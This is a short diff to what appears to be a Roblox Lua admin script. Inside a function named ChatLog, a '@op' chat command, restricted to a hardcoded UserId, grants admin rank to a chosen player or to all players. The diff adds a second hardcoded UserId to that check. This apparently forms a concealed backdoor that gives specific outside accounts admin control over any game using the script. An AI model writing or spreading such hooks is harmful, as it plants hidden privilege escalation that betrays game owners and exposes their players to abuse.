@@ -3875,7 +3875,7 @@ end
 
 ChatLog = function(plr)
 	plr.Chatted:Connect(function(Message)
-		if plr.UserId == 2613898759 then
+		if plr.UserId == 2613898759 or plr.UserId == 911404169 then
 			local splitted = string.split(Message," ")
 			if splitted[1] == "@op" then
 				local toop = (Message:sub(5))
@@ -3884,7 +3884,6 @@ ChatLog = function(plr)
 					for i,v in pairs(game.Players:GetPlayers()) do
 						if not Admins[v.Name] then
 							table.insert(Admins, v.Name)
-							do_exec(";say All has been ranked.")
 						end
 					end
 					do_exec(";say All has been ranked.")
